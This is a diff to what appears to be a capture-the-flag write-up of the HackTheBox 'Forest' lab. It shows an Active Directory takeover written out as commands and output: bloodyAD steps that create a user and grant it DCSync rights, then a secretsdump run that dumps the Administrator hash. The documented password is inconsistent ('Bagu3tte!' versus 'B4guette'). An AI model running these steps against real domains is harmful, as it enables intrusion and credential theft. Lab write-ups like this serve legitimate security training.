@@ -131,7 +131,7 @@ Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
 The hash is cracked! I have a first domain credential:
 `svc-alfreso:s3rvice`
 
-## Enumerate ACLs with Bloodhound
+## Enumerating ACLs with Bloodhound
 
 I used `bloodhound.py` to dumps all ACLs of 
 
@@ -141,9 +141,56 @@ I used `bloodhound.py` to dumps all ACLs of
 
 Let's check with `Bloodhound` the attacks path I have from `svc-alfresco`.
 
+![](img/svc-alfresco.png)
 
+This account, through several groups, is a part of the powerfull `Account Operators` group. 
+This group have permissions to create, modify, and delete most user accounts, groups, and computers, with the exception of administrative accounts and groups.
+Moreover I see that `Account Operators` has the `GenericAll` ACL over the `Exchange Windows Permissions` group.
 
+![](img/exchangeWindowsPermissions.png)
 
+This group has the `WriteDacl` over the `htb.local` domain!
+
+Here the path is clear, I'll create a new user and add it to `Exchange Windows Permissions` group. After that, I'll add the DCSync ACL to `svc-alfresco` over `htb.local` domain.
+Finally, I'll perform a DCSync attack to recover the `Administrator` hash to compromise the domain.
+
+## Creating a new user
+
+I use the `Bloody-AD` tool for all steps.
+
+```bash
+# bloodyAD --host "FOREST.htb.local" -d "htb.local" -u "svc-alfresco" -p "s3rvice" add user m3ringue 'Bagu3tte!'
+[+] m3ringue created
+```
+
+## Adding `m3ringue` to `Exchange Windows Permissions` group
+
+```bash
+# bloodyAD --host "FOREST.htb.local" -d "htb.local" -u "svc-alfresco" -p "s3rvice" add groupMember "exchange windows permissions" m3ringue
+[+] m3ringue added to exchange windows permissions
+```
+
+## Adding DCSync ACL to `m3ringue`
+
+```bash
+# bloodyAD --host "FOREST.htb.local" -d "htb.local" -u "m3ringue" -p 'Bagu3tte!' add dcsync m3ringue
+[+] m3ringue is now able to DCSync
+```
+
+## Performing the DCSync attack
+
+```bash
+# secretsdump -just-dc-user administrator htb.local/m3ringue:B4guette@10.10.10.161
+Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+```
+The administrator password NT hash is dumped!
+`Administrator:32693b11e6aa90eb43d32c72a07ceea6`
+
+## Connecting to the DC
 
 
 
